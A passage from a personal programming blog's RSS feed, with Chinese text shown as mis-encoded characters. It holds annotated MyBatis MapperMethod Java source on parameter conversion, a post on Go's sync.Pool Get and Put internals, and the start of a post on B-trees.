      &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BindingException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Unknown execution method for: &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getReturnType&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;isPrimitive&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;returnsVoid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BindingException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Mapper method &amp;#39;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;
          &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34; attempted to return null from a method with a primitive return type (&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getReturnType&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;).&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;


  &lt;span class=&#34;c1&#34;&gt;// å°†å‚æ•°è½¬æ¢ä¸ºSQLå‘½ä»¤å‚æ•°
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;convertArgsToSqlCommandParam&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;// è¿™é‡Œæœ‰ä¸€ä¸ªå‘ï¼š
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;// args æ˜¯Mapperæ–¹æ³•æ‰§è¡Œçš„å‚æ•°
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;// param æ˜¯ç¼–å†™çš„SQLè¯­å¥æ‰€éœ€è¦çš„å‘½ä»¤å‚æ•°
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;// å®ƒä»¬æœ‰ä»€ä¹ˆä¸åŒå‘¢ï¼š
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;// åœ¨MyBatisä¸­ä½ éœ€è¦ä½¿ç”¨åˆ†é¡µæ—¶å¯ä»¥ä¸æ˜¾å¼åœ¨SQLè¯­å¥ä¸­ä½¿ç”¨limitå‘½ä»¤
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;// ä½¿ç”¨RowBoundså¯¹è±¡ä½œä¸ºMapperçš„é¢å¤–å‚æ•°æ¥åšåˆ°æ•°æ®åˆ†é¡µ
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;// è¯¥å‚æ•°ä¸ç”¨åœ¨SQLè¯­å¥ä¸­æ˜¾å¼ä½¿ç”¨.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;paramCount&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;params&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;paramCount&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;//å¦‚æœæ²¡å‚æ•°
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
      &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hasNamedParameters&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;paramCount&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;//å¦‚æœåªæœ‰ä¸€ä¸ªå‚æ•°
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;params&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;keySet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;iterator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;intValue&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()];&lt;/span&gt;
      &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;//å¦åˆ™ï¼Œè¿”å›ä¸€ä¸ªParamMapï¼Œä¿®æ”¹å‚æ•°åï¼Œå‚æ•°åå°±æ˜¯å…¶ä½ç½®
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;param&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ParamMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;();&lt;/span&gt;
        &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Entry&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Integer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;entry&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;params&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;entrySet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
          &lt;span class=&#34;c1&#34;&gt;//1.å…ˆåŠ ä¸€ä¸ª#{0},#{1},#{2}...å‚æ•°
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;          &lt;span class=&#34;n&#34;&gt;param&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;put&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;entry&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getValue&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;entry&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getKey&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;intValue&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()]);&lt;/span&gt;
          &lt;span class=&#34;c1&#34;&gt;// issue #71, add param names as param1, param2...but ensure backward compatibility
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;          &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;genericParamName&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;param&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;valueOf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
          &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;param&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;containsKey&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;genericParamName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;//2.å†åŠ ä¸€ä¸ª#{param1},#{param2}...å‚æ•°
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;c1&#34;&gt;//ä½ å¯ä»¥ä¼ é€’å¤šä¸ªå‚æ•°ç»™ä¸€ä¸ªæ˜ å°„å™¨æ–¹æ³•ã€‚å¦‚æœä½ è¿™æ ·åšäº†,
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;c1&#34;&gt;//é»˜è®¤æƒ…å†µä¸‹å®ƒä»¬å°†ä¼šä»¥å®ƒä»¬åœ¨å‚æ•°åˆ—è¡¨ä¸­çš„ä½ç½®æ¥å‘½å,æ¯”å¦‚:#{param1},#{param2}ç­‰ã€‚
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;c1&#34;&gt;//å¦‚æœä½ æƒ³æ”¹å˜å‚æ•°çš„åç§°(åªåœ¨å¤šå‚æ•°æƒ…å†µä¸‹) ,é‚£ä¹ˆä½ å¯ä»¥åœ¨å‚æ•°ä¸Šä½¿ç”¨@Param(â€œparamNameâ€)æ³¨è§£ã€‚
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;n&#34;&gt;param&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;put&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;genericParamName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;entry&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getKey&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()]);&lt;/span&gt;
          &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
          &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++;&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;param&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
      &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;OK, æˆ‘åŸºæœ¬æƒ³è¯´çš„éƒ½è¯´å®Œäº†ã€‚åç»­å¯èƒ½ä¼šé¢å¤–è¡¥å……ä¸€äº›å†…å®¹ï¼Œä½†æ˜¯ä¸ä¼šåœ¨æœ¬æ–‡ä¸­ï¼Œä¼šå†™æ–°æ–‡ç« ã€‚&lt;/p&gt;
</description>
        </item>
        <item>
        <title>GoSyncPool</title>
        <link>https://sdttttt.github.io/p/gosyncpool/</link>
        <pubDate>Thu, 03 Sep 2020 17:06:04 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/gosyncpool/</guid>
        <description>&lt;p&gt;ä»Šå¤©åœ¨çœ‹Sentinel-golangæºç çš„æ—¶å€™å‘ç°sentinelåœ¨å†…éƒ¨ä½¿ç”¨äº†sync.Poolè¯¥ç»“æ„ä½“.çœ‹åˆ°Syncå’ŒPoolçš„æˆ‘ç¬¬ä¸€ååº”æƒ³åˆ°åº”è¯¥æ˜¯çº¿ç¨‹æ± ä¹‹ç±»çš„ä¸œè¥¿.åœ¨å®é™…çœ‹è¿‡åŸç†ä¹‹åå‘ç°å¹¶ä¸æ˜¯è¿™æ ·çš„.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;sync.Pool çš„ç›®çš„æ˜¯ä¸ºäº†åˆ©ç”¨å¯¹è±¡çš„å¤ç”¨æ¥å‡å°GCå‹åŠ›.ä½†æ˜¯å¼€é”€æ¯”è¾ƒé«˜.è¦æ–Ÿé…Œä½¿ç”¨.&lt;/p&gt;
&lt;p&gt;Poolå’Œgolangçš„GMPåç¨‹æ¨¡å‹çš„å…³ç³»æ¯”è¾ƒå¤§.
sync.Poolå¯¹æ¯ä¸€ä¸ªP(ç³»ç»Ÿçº¿ç¨‹)éƒ½åˆ†é…äº†ä¸€ä¸ªæœ¬åœ°æ± .&lt;/p&gt;
&lt;p&gt;æœ¬åœ°æ± ä¸­æœ‰2ä¸ªå±æ€§ï¼Œåˆ†åˆ«æ˜¯privateå’Œshareã€‚
privateåªèƒ½è¢«å½“å‰Pè®¿é—®ï¼Œshareå¯ä»¥è¢«ä¸åŒçš„Pè®¿é—®.&lt;/p&gt;
&lt;p&gt;åœ¨æ‰§è¡ŒGet or Putçš„æ—¶å€™.ä¼šå¯¹åº”å½“å‰æ‰§è¡ŒPçš„æœ¬åœ°æ± .&lt;/p&gt;
&lt;h4 id=&#34;get&#34;&gt;Get&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;å°è¯•ä»æœ¬åœ°På¯¹åº”çš„é‚£ä¸ªæœ¬åœ°æ± ä¸­è·å–ä¸€ä¸ªå¯¹è±¡å€¼, å¹¶ä»æœ¬åœ°æ± å†²åˆ é™¤è¯¥å€¼ã€‚&lt;/li&gt;
&lt;li&gt;å¦‚æœè·å–å¤±è´¥ï¼Œé‚£ä¹ˆä»å…±äº«æ± ä¸­è·å–, å¹¶ä»å…±äº«é˜Ÿåˆ—ä¸­åˆ é™¤è¯¥å€¼ã€‚&lt;/li&gt;
&lt;li&gt;å¦‚æœè·å–å¤±è´¥ï¼Œé‚£ä¹ˆä»å…¶ä»–Pçš„å…±äº«æ± ä¸­å·ä¸€ä¸ªè¿‡æ¥ï¼Œå¹¶åˆ é™¤å…±äº«æ± ä¸­çš„è¯¥å€¼(p.getSlow())ã€‚&lt;/li&gt;
&lt;li&gt;å¦‚æœä»ç„¶å¤±è´¥ï¼Œé‚£ä¹ˆç›´æ¥é€šè¿‡New()åˆ†é…ä¸€ä¸ªè¿”å›å€¼ï¼Œæ³¨æ„è¿™ä¸ªåˆ†é…çš„å€¼ä¸ä¼šè¢«æ”¾å…¥æ± ä¸­ã€‚New()è¿”å›ç”¨æˆ·æ³¨å†Œçš„Newå‡½æ•°çš„å€¼ï¼Œå¦‚æœç”¨æˆ·æœªæ³¨å†ŒNewï¼Œé‚£ä¹ˆè¿”å›nilã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;put&#34;&gt;Put&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;å¦‚æœæ”¾å…¥çš„å€¼ä¸ºç©ºï¼Œç›´æ¥return.&lt;/li&gt;
&lt;li&gt;æ£€æŸ¥å½“å‰goroutineçš„æ˜¯å¦è®¾ç½®å¯¹è±¡æ± ç§æœ‰å€¼ï¼Œå¦‚æœæ²¡æœ‰åˆ™å°†xèµ‹å€¼ç»™å…¶ç§æœ‰æˆå‘˜ï¼Œå¹¶å°†xè®¾ç½®ä¸ºnilã€‚&lt;/li&gt;
&lt;li&gt;å¦‚æœå½“å‰goroutineç§æœ‰å€¼å·²ç»è¢«è®¾ç½®ï¼Œé‚£ä¹ˆå°†è¯¥å€¼è¿½åŠ åˆ°å…±äº«åˆ—è¡¨ã€‚&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>B Tree</title>
        <link>https://sdttttt.github.io/p/b-tree/</link>
        <pubDate>Sun, 30 Aug 2020 20:41:54 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/b-tree/</guid>
        <description>&lt;p&gt;è¿™ç¯‡æ–‡ç« ä»¥æ•°æ®åº“å­˜å‚¨çš„æ•°æ®ç»“æ„æ¥å¼•å‡ºæœ¬æ–‡çš„é‡ç‚¹&lt;strong&gt;Bæ ‘&lt;/strong&gt;,ä»¥åŠåé¢è¿˜æœ‰å¦ä¸€ç§æ•°æ®ç»“æ„&lt;strong&gt;B+æ ‘&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;è¯•æƒ³, å¦‚æœä½ æƒ³æŒä¹…åŒ–å¤§é‡çš„æ•°æ®åœ¨ç¡¬ç›˜ä¸Š, åŒæ—¶è¿˜å¸Œæœ›èƒ½é«˜æ•ˆçš„æŸ¥è¯¢å’Œä¿®æ”¹ä»–ä»¬, ä½ ä¼šæ€ä¹ˆåš, ä½¿ç”¨å“ªç§æ•°æ®ç»“æ„.&lt;/p&gt;
&lt;p&gt;æ•°ç»„å’Œé“¾è¡¨, ä»–ä»¬çš„ç¼ºç‚¹å¾ˆæ˜æ˜¾, æˆ‘ä»¬å¯»æ‰¾æ•°æ®éœ€è¦éå†æ•´ä¸ªæ•°æ®ç»“æ„, è¯•æƒ³ä¸€ä¸‹ä½ çš„æ•°æ®åº“ä¸­æœ‰50PBçš„æ•°æ®, è¿™ä¸ªå¼€é”€æ˜¯æˆ‘ä»¬æ— æ³•æ¥å—çš„.&lt;/p&gt;
&lt;p&gt;å“ˆå¸Œè¡¨, é€šè¿‡ç»™å®šçš„æ•°æ®é€šè¿‡Hashå‡½æ•°ç”Ÿæˆå¯¹åº”çš„ç´¢å¼•, èƒ½éå¸¸é«˜æ•ˆçš„æ‰¾åˆ°å¯¹åº”çš„æ•°æ®. ä½†æ˜¯, å“ˆå¸Œè¡¨ä¸èƒ½ç”¨äºèŒƒå›´æŸ¥è¯¢.&lt;/p&gt;
&lt;p&gt;äºŒå‰æ ‘, ä¸€ç§ä½¿ç”¨äºŒåˆ†æ³•ä½œä¸ºæŸ¥è¯¢ç®—æ³•çš„æ•°æ®ç»“æ„, åœ¨å†…å­˜ä¸­, äºŒå‰æ ‘çš„æ•ˆç‡ç¡®å®éå¸¸é«˜, ä½†æ˜¯å¦‚æœæ˜¯åœ¨ç¡¬ç›˜ä¸Š, æ¯æ¬¡è¯»å–èŠ‚ç‚¹, éƒ½éœ€è¦è¿›è¡Œä¸€æ¬¡IO, éšç€æ•°æ®é‡çš„å¢å¤§, æ·±åº¦é€æ¸åŠ æ·±, äºŒå‰æ ‘çš„æ•ˆç‡å°±ä¼šå¤§å¤§é™ä½.&lt;/p&gt;
&lt;h2 id=&#34;b-tree&#34;&gt;B Tree&lt;/h2&gt;
&lt;p&gt;Bæ ‘å­˜åœ¨ä¸€äº›å’ŒäºŒå‰æ ‘ä¸ä¸€æ ·çš„åœ°æ–¹: äºŒå‰æ ‘æ¯ä¸ªèŠ‚ç‚¹åªä¿å­˜ä¸€ä»½æ•°æ®ä»¥åŠä¸¤ä¸ªæŒ‡é’ˆ, Bæ ‘åœ¨æ¯ä¸ªèŠ‚ç‚¹éƒ½å¯ä»¥ä¿ç•™ä¸€æ ·æ•°é‡çš„æ•°æ®å’ŒæŒ‡é’ˆ, æŒ‡é’ˆçš„æ•°é‡ä¸ºæ•°æ®çš„æ•°é‡+1.&lt;/p&gt;
&lt;p&gt;åœ¨Bæ ‘ä¸­è¿˜æœ‰å­˜åœ¨ä¸€ä¸ªæ¦‚å¿µ, é˜¶æ•°, å®ƒå†³å®šäº†è¯¥Bæ ‘æ¯ä¸ªèŠ‚ç‚¹åº”è¯¥æœ‰å¤šå°‘æ•°æ®ä»¥åŠæŒ‡é’ˆ.&lt;/p&gt;
&lt;h3 id=&#34;rules&#34;&gt;Rules&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;æ’åºæ–¹å¼ï¼šæ‰€æœ‰èŠ‚ç‚¹å…³é”®å­—æ˜¯æŒ‰é€’å¢æ¬¡åºæ’åˆ—ï¼Œå¹¶éµå¾ªå·¦å°å³å¤§åŸåˆ™ï¼›ä¾‹å¦‚ä¸€ä¸ªèŠ‚ç‚¹èƒ½å­˜æ”¾3ä»½æ•°æ®, è¯¥æ•°æ®éœ€è¦ä»å·¦åˆ°å³å¢åºå­˜æ”¾, 1, 2, 3.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å­èŠ‚ç‚¹æ•°ï¼šéå¶èŠ‚ç‚¹çš„å­èŠ‚ç‚¹æ•°&amp;gt;1ï¼Œä¸”&amp;lt;=M ï¼Œä¸”M&amp;gt;=2ï¼Œç©ºæ ‘é™¤å¤–(æ³¨ï¼šMé˜¶ä»£è¡¨ä¸€ä¸ªæ ‘èŠ‚ç‚¹æœ€å¤šæœ‰å¤šå°‘ä¸ªæŸ¥æ‰¾è·¯å¾„ï¼ŒM=Mè·¯,å½“M=2åˆ™æ˜¯2å‰æ ‘,M=3åˆ™æ˜¯3å‰)ï¼›&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å…³é”®å­—æ•°ï¼šå­èŠ‚ç‚¹çš„å…³é”®å­—æ•°é‡å¤§äºç­‰äºceil(m/2)-1ä¸ªä¸”å°äºç­‰äºM-1ä¸ª(æ³¨ï¼šceil()æ˜¯ä¸ªæœæ­£æ— ç©·æ–¹å‘å–æ•´çš„å‡½æ•° å¦‚ceil(1.1)ç»“æœä¸º2);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ‰€æœ‰å¶å­èŠ‚ç‚¹å‡åœ¨åŒä¸€å±‚ã€å¶å­èŠ‚ç‚¹é™¤äº†åŒ…å«äº†å…³é”®å­—å’Œå…³é”®å­—è®°å½•çš„æŒ‡é’ˆå¤–ä¹Ÿæœ‰æŒ‡å‘å…¶å­èŠ‚ç‚¹çš„æŒ‡é’ˆåªä¸è¿‡å…¶æŒ‡é’ˆåœ°å€éƒ½ä¸ºnullå¯¹åº”ä¸‹å›¾æœ€åä¸€å±‚èŠ‚ç‚¹çš„ç©ºæ ¼å­;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;find&#34;&gt;Find&lt;/h3&gt;
&lt;p&gt;æˆ‘ä»¬ç”¨ä¸€ä¸ªå›¾å’Œä¸€ä¸ªå®é™…çš„ä¾‹å­æ¥ç†è§£Bæ ‘(è¿™é‡Œä¸ºäº†ç†è§£æ–¹ä¾¿æˆ‘å°±ç›´æ¥ç”¨å®é™…å­—æ¯çš„å¤§å°æ¥æ’åˆ—C&amp;gt;B&amp;gt;A):&lt;/p&gt;
